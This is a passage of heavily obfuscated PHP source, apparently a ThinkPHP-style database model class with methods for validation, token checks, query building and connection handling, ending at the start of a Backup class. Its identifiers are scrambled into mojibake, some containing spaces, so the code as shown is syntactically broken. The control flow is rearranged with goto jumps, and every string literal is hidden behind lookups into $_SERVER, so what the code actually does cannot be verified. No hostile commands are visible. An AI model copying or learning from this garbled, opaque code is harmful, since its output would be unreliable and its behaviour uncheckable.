THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Eˆ’‘™“ø[269]])) { $c …ğÊƒ¥’ = $this->options[$Eˆ’‘™“ø[269]]; unset($this->options[$Eˆ’‘™“ø[269]]); } elseif ($E“Ôœ¯·ô¡ == THINK_MODEL_INSERT && isset($this->insertFields)) { $c …ğÊƒ¥’ = $this->insertFields; } elseif ($E“Ôœ¯·ô¡ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $c …ğÊƒ¥’ = $this->updateFields; } goto Fï™¹º—µ; e²­ïğ¯äİ: return $aÅ˜à „…›; goto dùïï›‘™ˆ; Fï™¹º—µ: if (isset($c …ğÊƒ¥’)) { if (is_string($c …ğÊƒ¥’)) { $c …ğÊƒ¥’ = explode($Eˆ’‘™“ø[47], $c …ğÊƒ¥’); } if (think_config($Eˆ’‘™“ø[294])) { $c …ğÊƒ¥’[] = think_config($Eˆ’‘™“ø[295]); } foreach ($aÅ˜à „…› as $E¾·šÓ µ => $a³ƒöÍ»–”) { if (!in_array($E¾·šÓ µ, $c …ğÊƒ¥’)) { unset($aÅ˜à „…›[$E¾·šÓ µ]); } } } if (!$this->autoValidation($aÅ˜à „…›, $E“Ôœ¯·ô¡)) { return !1; } if (!$this->autoCheckToken($aÅ˜à „…›)) { $this->error = think_lang($Eˆ’‘™“ø[296]); return !1; } goto fî»”…Á÷»; fî»”…Á÷»: if ($this->autoCheckFields) { $c …ğÊƒ¥’ = $this->getDbFields(); foreach ($aÅ˜à „…› as $E¾·šÓ µ => $a³ƒöÍ»–”) { if (!in_array($E¾·šÓ µ, $c …ğÊƒ¥’)) { unset($aÅ˜à „…›[$E¾·šÓ µ]); } elseif (MAGIC_QUOTES_GPC && is_string($a³ƒöÍ»–”)) { $aÅ˜à „…›[$E¾·šÓ µ] = stripslashes($a³ƒöÍ»–”); } } } $this->autoOperation($aÅ˜à „…›, $E“Ôœ¯·ô¡); $this->data = $aÅ˜à „…›; goto e²­ïğ¯äİ; d‰ÜØ‚: $Eˆ’‘™“ø =& $_SERVER[Â€Á›¨õ]; if (empty($aÅ˜à „…›)) { $aÅ˜à „…› = $_POST; } elseif (is_object($aÅ˜à „…›)) { $aÅ˜à „…› = get_object_vars($aÅ˜à „…›); } if (empty($aÅ˜à „…›) || !is_array($aÅ˜à „…›)) { $this->error = think_lang($Eˆ’‘™“ø[267]); return !1; } goto cõÓ›‹ÒÑ; dùïï›‘™ˆ: } public function autoCheckToken($B©Ÿ‰·ÊÓ·) { $d£±òéğÇÁ =& $_SERVER[Â€Á›¨õ]; if (isset($this->options[$d£±òéğÇÁ[297]]) && !$this->options[$d£±òéğÇÁ[297]]) { return !0; } if (think_config($d£±òéğÇÁ[294])) { $c©¸•ÊÓ = think_config($d£±òéğÇÁ[295]); if (!isset($B©Ÿ‰·ÊÓ·[$c©¸•ÊÓ]) || Session::get($c©¸•ÊÓ)) { return !1; } list($FÀğô°‡¥, $f ÍÒº¡·À) = explode($d£±òéğÇÁ[70], $B©Ÿ‰·ÊÓ·[$c©¸•ÊÓ]); if ($f ÍÒº¡·À && Session::get($c©¸•ÊÓ . $d£±òéğÇÁ[94] . $FÀğô°‡¥) === $f ÍÒº¡·À) { Session::remove($c©¸•ÊÓ . $d£±òéğÇÁ[94] . $FÀğô°‡¥); return !0; } if (think_config($d£±òéğÇÁ[298])) { Session::remove($c©¸•ÊÓ . $d£±òéğÇÁ[94] . $FÀğô°‡¥); } return !1; } return !0; } public function regex($C·ÈÏµ‘…, $EŠªÄã¯) { $FÓÊĞ½Ãµ =& $_SERVER[Â€Á›¨õ]; $E¡ÖÌÏôá = array($FÓÊĞ½Ãµ[299] => $FÓÊĞ½Ãµ[300], $FÓÊĞ½Ãµ[301] => $FÓÊĞ½Ãµ[302], $FÓÊĞ½Ãµ[303] => $FÓÊĞ½Ãµ[304], $FÓÊĞ½Ãµ[305] => $FÓÊĞ½Ãµ[306], $FÓÊĞ½Ãµ[307] => $FÓÊĞ½Ãµ[308], $FÓÊĞ½Ãµ[309] => $FÓÊĞ½Ãµ[310], $FÓÊĞ½Ãµ[311] => $FÓÊĞ½Ãµ[312], $FÓÊĞ½Ãµ[286] => $FÓÊĞ½Ãµ[313], $FÓÊĞ½Ãµ[314] => $FÓÊĞ½Ãµ[315]); if (isset($E¡ÖÌÏôá[strtolower($EŠªÄã¯)])) { $EŠªÄã¯ = $E¡ÖÌÏôá[strtolower($EŠªÄã¯)]; } return preg_match($EŠªÄã¯, $C·ÈÏµ‘…) === 1; } private function autoOperation(&$B‚†Šó¿§, $EŠïÃîöíÚ) { $fäÇ½›•™¤ =& $_SERVER[Â€Á›¨õ]; if (!empty($this->options[$fäÇ½›•™¤[316]])) { $Fè¦ì—¥Ñ² = $this->options[$fäÇ½›•™¤[316]]; unset($this->options[$fäÇ½›•™¤[316]]); } elseif (!empty($this->_auto)) { $Fè¦ì—¥Ñ² = $this->_auto; } if (isset($Fè¦ì—¥Ñ²)) { foreach ($Fè¦ì—¥Ñ² as $A¦”–ÁîÊ) { if (empty($A¦”–ÁîÊ[2])) { $A¦”–ÁîÊ[2] = THINK_MODEL_INSERT; } if ($EŠïÃîöíÚ == $A¦”–ÁîÊ[2] || $A¦”–ÁîÊ[2] == THINK_MODEL_BOTH) { switch (trim($A¦”–ÁîÊ[3])) { case $fäÇ½›•™¤[317]: case $fäÇ½›•™¤[318]: $C®øÌ¬ÉÁØ = isset($A¦”–ÁîÊ[4]) ? (array) $A¦”–ÁîÊ[4] : array(); if (isset($B‚†Šó¿§[$A¦”–ÁîÊ[0]])) { array_unshift($C®øÌ¬ÉÁØ, $B‚†Šó¿§[$A¦”–ÁîÊ[0]]); } if ($fäÇ½›•™¤[317] == $A¦”–ÁîÊ[3]) { $B‚†Šó¿§[$A¦”–ÁîÊ[0]] = call_user_func_array($A¦”–ÁîÊ[1], $C®øÌ¬ÉÁØ); } else { $B‚†Šó¿§[$A¦”–ÁîÊ[0]] = call_user_func_array(array(&$this, $A¦”–ÁîÊ[1]), $C®øÌ¬ÉÁØ); } break; case $fäÇ½›•™¤[269]: $B‚†Šó¿§[$A¦”–ÁîÊ[0]] = $B‚†Šó¿§[$A¦”–ÁîÊ[1]]; break; case $fäÇ½›•™¤[319]: if ($fäÇ½›•™¤[33] === $B‚†Šó¿§[$A¦”–ÁîÊ[0]]) { unset($B‚†Šó¿§[$A¦”–ÁîÊ[0]]); } break; case $fäÇ½›•™¤[320]: default: $B‚†Šó¿§[$A¦”–ÁîÊ[0]] = $A¦”–ÁîÊ[1]; } if (!1 === $B‚†Šó¿§[$A¦”–ÁîÊ[0]]) { unset($B‚†Šó¿§[$A¦”–ÁîÊ[0]]); } } } } return $B‚†Šó¿§; } protected function autoValidation($b®ÌÂö£, $b‡…ê•Ò¹) { $b¬²•‡«‚ğ =& $_SERVER[Â€Á›¨õ]; if (!empty($this->options[$b¬²•‡«‚ğ[321]])) { $AŞêôÀ‹Şõ = $this->options[$b¬²•‡«‚ğ[321]]; unset($this->options[$b¬²•‡«‚ğ[321]]); } elseif (!empty($this->_validate)) { $AŞêôÀ‹Şõ = $this->_validate; } if (isset($AŞêôÀ‹Şõ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($AŞêôÀ‹Şõ as $f—¿íóÅÉÁ => $eá³ëôùŞÍ) { if (empty($eá³ëôùŞÍ[5]) || $eá³ëôùŞÍ[5] == THINK_MODEL_BOTH || $eá³ëôùŞÍ[5] == $b‡…ê•Ò¹) { if (0 == strpos($eá³ëôùŞÍ[2], $b¬²•‡«‚ğ[322]) && strpos($eá³ëôùŞÍ[2], $b¬²•‡«‚ğ[323])) { $eá³ëôùŞÍ[2] = think_lang(substr($eá³ëôùŞÍ[2], 2, -1)); } $eá³ëôùŞÍ[3] = isset($eá³ëôùŞÍ[3]) ? $eá³ëôùŞÍ[3] : THINK_EXISTS_VALIDATE; $eá³ëôùŞÍ[4] = isset($eá³ëôùŞÍ[4]) ? $eá³ëôùŞÍ[4] : $b¬²•‡«‚ğ[324]; switch ($eá³ëôùŞÍ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($b®ÌÂö£, $eá³ëôùŞÍ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($b¬²•‡«‚ğ[33] != trim($b®ÌÂö£[$eá³ëôùŞÍ[0]])) { if (!1 === $this->_validationField($b®ÌÂö£, $eá³ëôùŞÍ)) { return !1; } } break; default: if (isset($b®ÌÂö£[$eá³ëôùŞÍ[0]])) { if (!1 === $this->_validationField($b®ÌÂö£, $eá³ëôùŞÍ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($aµ¬«®ß½Æ, $EÃÒ›¦–ªÀ) { if (!1 === $this->_validationFieldItem($aµ¬«®ß½Æ, $EÃÒ›¦–ªÀ)) { if ($this->patchValidate) { $this->error[$EÃÒ›¦–ªÀ[0]] = $EÃÒ›¦–ªÀ[2]; } else { $this->error = $EÃÒ›¦–ªÀ[2]; return !1; } } return; } protected function _validationFieldItem($e¬‹í³Ã…Ç, $e¾Óî×Û‰¸) { $aÎ¥Æİ‚á =& $_SERVER[Â€Á›¨õ]; switch (strtolower(trim($e¾Óî×Û‰¸[4]))) { case $aÎ¥Æİ‚á[317]: case $aÎ¥Æİ‚á[318]: $déÆÒ¯’¸ˆ = isset($e¾Óî×Û‰¸[6]) ? (array) $e¾Óî×Û‰¸[6] : array(); if (is_string($e¾Óî×Û‰¸[0]) && strpos($e¾Óî×Û‰¸[0], $aÎ¥Æİ‚á[47])) { $e¾Óî×Û‰¸[0] = explode($aÎ¥Æİ‚á[47], $e¾Óî×Û‰¸[0]); } if (is_array($e¾Óî×Û‰¸[0])) { foreach ($e¾Óî×Û‰¸[0] as $aº‚È‹ª¨) { $e§ŞŠÉó[$aº‚È‹ª¨] = $e¬‹í³Ã…Ç[$aº‚È‹ª¨]; } array_unshift($déÆÒ¯’¸ˆ, $e§ŞŠÉó); } else { array_unshift($déÆÒ¯’¸ˆ, $e¬‹í³Ã…Ç[$e¾Óî×Û‰¸[0]]); } if ($aÎ¥Æİ‚á[317] == $e¾Óî×Û‰¸[4]) { return call_user_func_array($e¾Óî×Û‰¸[1], $déÆÒ¯’¸ˆ); } else { return call_user_func_array(array(&$this, $e¾Óî×Û‰¸[1]), $déÆÒ¯’¸ˆ); } case $aÎ¥Æİ‚á[325]: return $e¬‹í³Ã…Ç[$e¾Óî×Û‰¸[0]] == $e¬‹í³Ã…Ç[$e¾Óî×Û‰¸[1]]; case $aÎ¥Æİ‚á[326]: if (is_string($e¾Óî×Û‰¸[0]) && strpos($e¾Óî×Û‰¸[0], $aÎ¥Æİ‚á[47])) { $e¾Óî×Û‰¸[0] = explode($aÎ¥Æİ‚á[47], $e¾Óî×Û‰¸[0]); } $aÑ“Ò¦æ–ë = array(); if (is_array($e¾Óî×Û‰¸[0])) { foreach ($e¾Óî×Û‰¸[0] as $aº‚È‹ª¨) { $aÑ“Ò¦æ–ë[$aº‚È‹ª¨] = $e¬‹í³Ã…Ç[$aº‚È‹ª¨]; } } else { $aÑ“Ò¦æ–ë[$e¾Óî×Û‰¸[0]] = $e¬‹í³Ã…Ç[$e¾Óî×Û‰¸[0]]; } if (!empty($e¬‹í³Ã…Ç[$this->getPk()])) { $aÑ“Ò¦æ–ë[$this->getPk()] = array($aÎ¥Æİ‚á[327], $e¬‹í³Ã…Ç[$this->getPk()]); } if ($this->where($aÑ“Ò¦æ–ë)->find()) { return !1; } return !0; default: return $this->check($e¬‹í³Ã…Ç[$e¾Óî×Û‰¸[0]], $e¾Óî×Û‰¸[1], $e¾Óî×Û‰¸[4]); } } public function check($EÏ¼ù±×‡, $BÈˆ‚ƒß­«, $c§Æ”„°­¤ = "\162\x65\147\x65\170") { $b§µøèïƒï =& $_SERVER[Â€Á›¨õ]; $c§Æ”„°­¤ = strtolower(trim($c§Æ”„°­¤)); switch ($c§Æ”„°­¤) { case $b§µøèïƒï[7]: case $b§µøèïƒï[328]: $E“¾¤æ—Âœ = is_array($BÈˆ‚ƒß­«) ? $BÈˆ‚ƒß­« : explode($b§µøèïƒï[47], $BÈˆ‚ƒß­«); return $c§Æ”„°­¤ == $b§µøèïƒï[7] ? in_array($EÏ¼ù±×‡, $E“¾¤æ—Âœ) : !in_array($EÏ¼ù±×‡, $E“¾¤æ—Âœ); case $b§µøèïƒï[329]: case $b§µøèïƒï[330]: if (is_array($BÈˆ‚ƒß­«)) { $d¿‰¤…¢ˆ = $BÈˆ‚ƒß­«[0]; $D››î¨™« = $BÈˆ‚ƒß­«[1]; } else { list($d¿‰¤…¢ˆ, $D››î¨™«) = explode($b§µøèïƒï[47], $BÈˆ‚ƒß­«); } return $c§Æ”„°­¤ == $b§µøèïƒï[329] ? $EÏ¼ù±×‡ >= $d¿‰¤…¢ˆ && $EÏ¼ù±×‡ <= $D››î¨™« : $EÏ¼ù±×‡ < $d¿‰¤…¢ˆ || $EÏ¼ù±×‡ > $D››î¨™«; case $b§µøèïƒï[331]: case $b§µøèïƒï[332]: return $c§Æ”„°­¤ == $b§µøèïƒï[331] ? $EÏ¼ù±×‡ == $BÈˆ‚ƒß­« : $EÏ¼ù±×‡ != $BÈˆ‚ƒß­«; case $b§µøèïƒï[333]: $CÔ§Íà†Ü = mb_strlen($EÏ¼ù±×‡, $b§µøèïƒï[334]); if (strpos($BÈˆ‚ƒß­«, $b§µøèïƒï[47])) { list($d¿‰¤…¢ˆ, $D››î¨™«) = explode($b§µøèïƒï[47], $BÈˆ‚ƒß­«); return $CÔ§Íà†Ü >= $d¿‰¤…¢ˆ && $CÔ§Íà†Ü <= $D››î¨™«; } else { return $CÔ§Íà†Ü == $BÈˆ‚ƒß­«; } case $b§µøèïƒï[335]: list($E™ïçùÒâå, $Dîô’Œˆ) = explode($b§µøèïƒï[47], $BÈˆ‚ƒß­«); if (!is_numeric($E™ïçùÒâå)) { $E™ïçùÒâå = strtotime($E™ïçùÒâå); } if (!is_numeric($Dîô’Œˆ)) { $Dîô’Œˆ = strtotime($Dîô’Œˆ); } return NOW_TIME >= $E™ïçùÒâå && NOW_TIME <= $Dîô’Œˆ; case $b§µøèïƒï[336]: return in_array(get_client_ip(), explode($b§µøèïƒï[47], $BÈˆ‚ƒß­«)); case $b§µøèïƒï[337]: return !in_array(get_client_ip(), explode($b§µøèïƒï[47], $BÈˆ‚ƒß­«)); case $b§µøèïƒï[324]: default: return $this->regex($EÏ¼ù±×‡, $BÈˆ‚ƒß­«); } } public function query($e‡¼¤šØÄ, $d¹åÍ©‡É£ = false) { $CÔ’«äËÒ… =& $_SERVER[Â€Á›¨õ]; if (!is_bool($d¹åÍ©‡É£) && !is_array($d¹åÍ©‡É£)) { $d¹åÍ©‡É£ = func_get_args(); array_shift($d¹åÍ©‡É£); } $e‡¼¤šØÄ = str_replace(array($CÔ’«äËÒ…[227], $CÔ’«äËÒ…[338]), $CÔ’«äËÒ…[50], $e‡¼¤šØÄ); $e‡¼¤šØÄ = $this->parseSql($e‡¼¤šØÄ, $d¹åÍ©‡É£); return $this->db->query($e‡¼¤šØÄ); } public function execute($AÇíŠ˜ÂõŒ, $EùÔÔÉÙæî = false) { if (!is_bool($EùÔÔÉÙæî) && !is_array($EùÔÔÉÙæî)) { $EùÔÔÉÙæî = func_get_args(); array_shift($EùÔÔÉÙæî); } $AÇíŠ˜ÂõŒ = $this->parseSql($AÇíŠ˜ÂõŒ, $EùÔÔÉÙæî); return $this->db->execute($AÇíŠ˜ÂõŒ); } protected function parseSql($d½‡ô‘È¡, $Cõø£ÛË’·) { $D‹Æô‰¢õ× =& $_SERVER[Â€Á›¨õ]; if (!0 === $Cõø£ÛË’·) { $f‰ˆ’”›ä† = $this->_parseOptions(); $d½‡ô‘È¡ = $this->db->parseSql($d½‡ô‘È¡, $f‰ˆ’”›ä†); } elseif (is_array($Cõø£ÛË’·)) { $Cõø£ÛË’· = array_map(array($this->db, $D‹Æô‰¢õ×[339]), $Cõø£ÛË’·); $d½‡ô‘È¡ = vsprintf($d½‡ô‘È¡, $Cõø£ÛË’·); } else { $d½‡ô‘È¡ = strtr($d½‡ô‘È¡, array($D‹Æô‰¢õ×[340] => $this->getTableName(), $D‹Æô‰¢õ×[341] => think_config($D‹Æô‰¢õ×[240]))); } $this->db->setModel($this->name); return $d½‡ô‘È¡; } public function db($F±ÂÕÚƒ = '', $dŞêÅ¨‹•ğ = '', $A÷ÉÔëÖÕ­ = array()) { goto aâˆèØ¤î; DÇ¿çê«Íñ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto CĞ¯²Ìéæ; aâˆèØ¤î: $cÀ‰Ş†ƒİ =& $_SERVER[Â€Á›¨õ]; if ($cÀ‰Ş†ƒİ[33] === $F±ÂÕÚƒ && $this->db) { return $this->db; } static $DßĞ‡Õ™Å = array(); goto bÉ“ä¨¶­÷; bÉ“ä¨¶­÷: static $aˆ¯†‹³÷ = array(); if (!isset($aˆ¯†‹³÷[$F±ÂÕÚƒ]) || isset($aˆ¯†‹³÷[$F±ÂÕÚƒ]) && $dŞêÅ¨‹•ğ && $DßĞ‡Õ™Å[$F±ÂÕÚƒ] != $dŞêÅ¨‹•ğ) { if (!empty($dŞêÅ¨‹•ğ) && is_string($dŞêÅ¨‹•ğ) && !1 === strpos($dŞêÅ¨‹•ğ, $cÀ‰Ş†ƒİ[8])) { $dŞêÅ¨‹•ğ = think_config($dŞêÅ¨‹•ğ); } $aˆ¯†‹³÷[$F±ÂÕÚƒ] = Db::getInstance($dŞêÅ¨‹•ğ); } elseif (NULL === $dŞêÅ¨‹•ğ) { $aˆ¯†‹³÷[$F±ÂÕÚƒ]->close(); unset($aˆ¯†‹³÷[$F±ÂÕÚƒ]); return; } if (!empty($A÷ÉÔëÖÕ­)) { if (is_string($A÷ÉÔëÖÕ­)) { parse_str($A÷ÉÔëÖÕ­, $A÷ÉÔëÖÕ­); } foreach ($A÷ÉÔëÖÕ­ as $d‘ ÙêŒØ => $f§êÀ‹ù‰«) { $this->setProperty($d‘ ÙêŒØ, $f§êÀ‹ù‰«); } } goto cÊ–Ùº ë; cÊ–Ùº ë: $DßĞ‡Õ™Å[$F±ÂÕÚƒ] = $dŞêÅ¨‹•ğ; $this->db = $aˆ¯†‹³÷[$F±ÂÕÚƒ]; $this->_after_db(); goto DÇ¿çê«Íñ; CĞ¯²Ìéæ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $e¼Èù‡è‹¥ = get_class($this); if ($e¼Èù‡è‹¥ == $_SERVER[Â€Á›¨õ][342]) { return $this->name; } $this->name = substr($e¼Èù‡è‹¥, 0, -5); } return $this->name; } public function getTableName() { $Fß˜ö…ù¡„ =& $_SERVER[Â€Á›¨õ]; if (empty($this->trueTableName)) { $AŞ˜“ïÆˆ = !empty($this->tablePrefix) ? $this->tablePrefix : $Fß˜ö…ù¡„[33]; if (!empty($this->tableName)) { $AŞ˜“ïÆˆ .= $this->tableName; } else { $AŞ˜“ïÆˆ .= think_parse_name($this->name); } $this->trueTableName = strtolower($AŞ˜“ïÆˆ); } return (!empty($this->dbName) ? $this->dbName . $Fß˜ö…ù¡„[94] : $Fß˜ö…ù¡„[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $E³Â¶êÛ =& $_SERVER[Â€Á›¨õ]; return isset($this->fields[$E³Â¶êÛ[247]]) ? $this->fields[$E³Â¶êÛ[247]] : $this->pk; } public function getDbFields() { $BÃ¨Ø”Ô« =& $_SERVER[Â€Á›¨õ]; if (isset($this->options[$BÃ¨Ø”Ô«[275]])) { $A„Ğ’îÖ”Ú = $this->db->getFields($this->options[$BÃ¨Ø”Ô«[275]]); return $A„Ğ’îÖ”Ú ? array_keys($A„Ğ’îÖ”Ú) : !1; } if ($this->fields) { $A„Ğ’îÖ”Ú = $this->fields; unset($A„Ğ’îÖ”Ú[$BÃ¨Ø”Ô«[246]], $A„Ğ’îÖ”Ú[$BÃ¨Ø”Ô«[247]], $A„Ğ’îÖ”Ú[$BÃ¨Ø”Ô«[248]], $A„Ğ’îÖ”Ú[$BÃ¨Ø”Ô«[245]]); return $A„Ğ’îÖ”Ú; } return !1; } public function data($C‘ñ·íÅ‚Ç = '') { $A‡ˆ„ß£Â• =& $_SERVER[Â€Á›¨õ]; if ($A‡ˆ„ß£Â•[33] === $C‘ñ·íÅ‚Ç && !empty($this->data)) { return $this->data; } if (is_object($C‘ñ·íÅ‚Ç)) { $C‘ñ·íÅ‚Ç = get_object_vars($C‘ñ·íÅ‚Ç); } elseif (is_string($C‘ñ·íÅ‚Ç)) { parse_str($C‘ñ·íÅ‚Ç, $C‘ñ·íÅ‚Ç); } elseif (!is_array($C‘ñ·íÅ‚Ç)) { think_exception(think_lang($A‡ˆ„ß£Â•[267])); } $this->data = $C‘ñ·íÅ‚Ç; return $this; } public function join($d­¨ŒêÅÜ) { $e‰¨¥ßç‚¦ =& $_SERVER[Â€Á›¨õ]; if (is_array($d­¨ŒêÅÜ)) { $this->options[$e‰¨¥ßç‚¦[278]] = $d­¨ŒêÅÜ; } elseif (!empty($d­¨ŒêÅÜ)) { $this->options[$e‰¨¥ßç‚¦[278]][] = $d­¨ŒêÅÜ; } return $this; } public function union($DŒ˜™¦¤Õ—, $A¡®Õ¿åÒÙ = false) { goto CÜõ‰Ãˆ; d¸·È°ÈĞ: return $this; goto dî‰Ğ°÷Âë; Cï¼‚î™: if (is_object($DŒ˜™¦¤Õ—)) { $DŒ˜™¦¤Õ— = get_object_vars($DŒ˜™¦¤Õ—); } if (is_string($DŒ˜™¦¤Õ—)) { $F›ªÆ“±å² = $DŒ˜™¦¤Õ—; } elseif (is_array($DŒ˜™¦¤Õ—)) { if (isset($DŒ˜™¦¤Õ—[0])) { $this->options[$cˆ²ùñ»ß[343]] = array_merge($this->options[$cˆ²ùñ»ß[343]], $DŒ˜™¦¤Õ—); return $this; } else { $F›ªÆ“±å² = $DŒ˜™¦¤Õ—; } } else { think_exception(think_lang($cˆ²ùñ»ß[267])); } $this->options[$cˆ²ùñ»ß[343]][] = $F›ªÆ“±å²; goto d¸·È°ÈĞ; CÜõ‰Ãˆ: $cˆ²ùñ»ß =& $_SERVER[Â€Á›¨õ]; if (empty($DŒ˜™¦¤Õ—)) { return $this; } if ($A¡®Õ¿åÒÙ) { $this->options[$cˆ²ùñ»ß[343]][$cˆ²ùñ»ß[344]] = !0; } goto Cï¼‚î™; dî‰Ğ°÷Âë: } public function cache($Dêºİİ³äè = true, $d´İ©£âß = null, $CœâÃ¾Â°ƒ = '') { $Câ¸ÖÂƒ™½ =& $_SERVER[Â€Á›¨õ]; if (!1 !== $Dêºİİ³äè) { $this->options[$Câ¸ÖÂƒ™½[345]] = array($Câ¸ÖÂƒ™½[92] => $Dêºİİ³äè, $Câ¸ÖÂƒ™½[335] => $d´İ©£âß, $Câ¸ÖÂƒ™½[29] => $CœâÃ¾Â°ƒ); } return $this; } public function field($EÀß±©„½, $DÀÄÆ‚ç‹ = false) { $A‹ÈáòÔë‰ =& $_SERVER[Â€Á›¨õ]; if (!0 === $EÀß±©„½) { $d¦Ş©íîí = $this->getDbFields(); $EÀß±©„½ = $d¦Ş©íîí ? $d¦Ş©íîí : $A‹ÈáòÔë‰[182]; } elseif ($DÀÄÆ‚ç‹) { if (is_string($EÀß±©„½)) { $EÀß±©„½ = explode($A‹ÈáòÔë‰[47], $EÀß±©„½); } $d¦Ş©íîí = $this->getDbFields(); $EÀß±©„½ = $d¦Ş©íîí ? array_diff($d¦Ş©íîí, $EÀß±©„½) : $EÀß±©„½; } $this->options[$A‹ÈáòÔë‰[269]] = $EÀß±©„½; return $this; } public function scope($e»¨œ¡éæ• = '', $eƒÖÔÑÖ = NULL) { $AÍˆàÌóÌÓ =& $_SERVER[Â€Á›¨õ]; if ($AÍˆàÌóÌÓ[33] === $e»¨œ¡éæ•) { if (isset($this->_scope[$AÍˆàÌóÌÓ[34]])) { $F‘­˜ë‰‹ï = $this->_scope[$AÍˆàÌóÌÓ[34]]; } else { return $this; } } elseif (is_string($e»¨œ¡éæ•)) { $b¥Ÿ•œÉÚ» = explode($AÍˆàÌóÌÓ[47], $e»¨œ¡éæ•); $F‘­˜ë‰‹ï = array(); foreach ($b¥Ÿ•œÉÚ» as $bó¨ÆÒ¡À) { if (!isset($this->_scope[$bó¨ÆÒ¡À])) { continue; } $F‘­˜ë‰‹ï = array_merge($F‘­˜ë‰‹ï, $this->_scope[$bó¨ÆÒ¡À]); } if (!empty($eƒÖÔÑÖ) && is_array($eƒÖÔÑÖ)) { $F‘­˜ë‰‹ï = array_merge($F‘­˜ë‰‹ï, $eƒÖÔÑÖ); } } elseif (is_array($e»¨œ¡éæ•)) { $F‘­˜ë‰‹ï = $e»¨œ¡éæ•; } if (is_array($F‘­˜ë‰‹ï) && !empty($F‘­˜ë‰‹ï)) { $this->options = array_merge($this->options, array_change_key_case($F‘­˜ë‰‹ï)); } return $this; } public function where($dñ†ÉÙİøÆ, $b“¶†ËŸá‡ = null) { $F¼Ø±İ±½© =& $_SERVER[Â€Á›¨õ]; if (!is_null($b“¶†ËŸá‡) && is_string($dñ†ÉÙİøÆ)) { if (!is_array($b“¶†ËŸá‡)) { $b“¶†ËŸá‡ = func_get_args(); array_shift($b“¶†ËŸá‡); } $b“¶†ËŸá‡ = array_map(array($this->db, $F¼Ø±İ±½©[339]), $b“¶†ËŸá‡); $dñ†ÉÙİøÆ = vsprintf($dñ†ÉÙİøÆ, $b“¶†ËŸá‡); } elseif (is_object($dñ†ÉÙİøÆ)) { $dñ†ÉÙİøÆ = get_object_vars($dñ†ÉÙİøÆ); } elseif (is_array($dñ†ÉÙİøÆ)) { foreach ($dñ†ÉÙİøÆ as $F‘¡‚«®Š => $d“™‰Å¡Éï) { if ((is_numeric($F‘¡‚«®Š) || !$F‘¡‚«®Š) && is_string($d“™‰Å¡Éï)) { if (strpos($d“™‰Å¡Éï, $F¼Ø±İ±½©[346]) === 0) { continue; } think_trace($F¼Ø±İ±½©[347], $F¼Ø±İ±½©[33], $F¼Ø±İ±½©[46]); die; } } } if (is_string($dñ†ÉÙİøÆ) && $F¼Ø±İ±½©[33] != $dñ†ÉÙİøÆ) { $AÑÃˆ‡å†¥ = array(); $AÑÃˆ‡å†¥[$F¼Ø±İ±½©[348]] = $dñ†ÉÙİøÆ; $dñ†ÉÙİøÆ = $AÑÃˆ‡å†¥; } if (isset($this->options[$F¼Ø±İ±½©[271]])) { $this->options[$F¼Ø±İ±½©[271]] = array_merge($this->options[$F¼Ø±İ±½©[271]], $dñ†ÉÙİøÆ); } else { $this->options[$F¼Ø±İ±½©[271]] = $dñ†ÉÙİøÆ; } return $this; } public function limit($c•¶§¬‘†ğ, $aŒ”´ „Ï” = null) { $côãîƒ«•ù =& $_SERVER[Â€Á›¨õ]; $this->options[$côãîƒ«•ù[288]] = is_null($aŒ”´ „Ï”) ? $c•¶§¬‘†ğ : $c•¶§¬‘†ğ . $côãîƒ«•ù[47] . $aŒ”´ „Ï”; return $this; } public function page($a¦›ÀâÈÒÎ, $A …ìÚİÁò = null) { $Aå±Å÷ôÄÈ =& $_SERVER[Â€Á›¨õ]; $this->options[$Aå±Å÷ôÄÈ[349]] = is_null($A …ìÚİÁò) ? $a¦›ÀâÈÒÎ : $a¦›ÀâÈÒÎ . $Aå±Å÷ôÄÈ[47] . $A …ìÚİÁò; return $this; } public function comment($Dİ¬„âÖ°å) { $this->options[$_SERVER[Â€Á›¨õ][350]] = $Dİ¬„âÖ°å; return $this; } public function setProperty($b”¨£Ü˜Ì, $F’‡®ÂåÎé) { if (property_exists($this, $b”¨£Ü˜Ì)) { $this->{$b”¨£Ü˜Ì} = $F’‡®ÂåÎé; } return $this; } } goto A–—ìœÉ«‰; cÈĞ¢½Ñ£ƒ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $D‹Ø¿œéŞÎ =& $_SERVER[Â€Á›¨õ]; self::$name = date($D‹Ø¿œéŞÎ[700]); if (!($BÊíõ¸¥ºÕ = Model($D‹Ø¿œéŞÎ[701])->lastItem())) { $BÊíõ¸¥ºÕ = $this->initData(); } else { self::$name = $BÊíõ¸¥ºÕ[$D‹Ø¿œéŞÎ[28]]; if ($BÊíõ¸¥ºÕ[$D‹Ø¿œéŞÎ[702]] == $D‹Ø¿œéŞÎ[86]) { self::$name = date($D‹Ø¿œéŞÎ[703]); $D·Èêã‚‡Ê = 0; if (isset($BÊíõ¸¥ºÕ[$D‹Ø¿œéŞÎ[289]][$D‹Ø¿œéŞÎ[173]][$D‹Ø¿œéŞÎ[441]])) { $D·Èêã‚‡Ê = (int) $BÊíõ¸¥ºÕ[$D‹Ø¿œéŞÎ[289]][$D‹Ø¿œéŞÎ[173]][$D‹Ø¿œéŞÎ[441]]; } if ($BÊíõ¸¥ºÕ[$D‹Ø¿œéŞÎ[28]] == self::$name) { Model($D‹Ø¿œéŞÎ[701])->remove($BÊíõ¸¥ºÕ[$D‹Ø¿œéŞÎ[388]]); } $BÊíõ¸¥ºÕ = $this->initData($D·Èêã‚‡Ê, $BÊíõ¸¥ºÕ[$D‹Ø¿œéŞÎ[704]]); } else { $this->checkStore($BÊíõ¸¥ºÕ[$D‹Ø¿œéŞÎ[704]]); } } self::$option = $BÊíõ¸¥ºÕ; } private function initData($b…ÄİŒ§Ø¿ = 0, 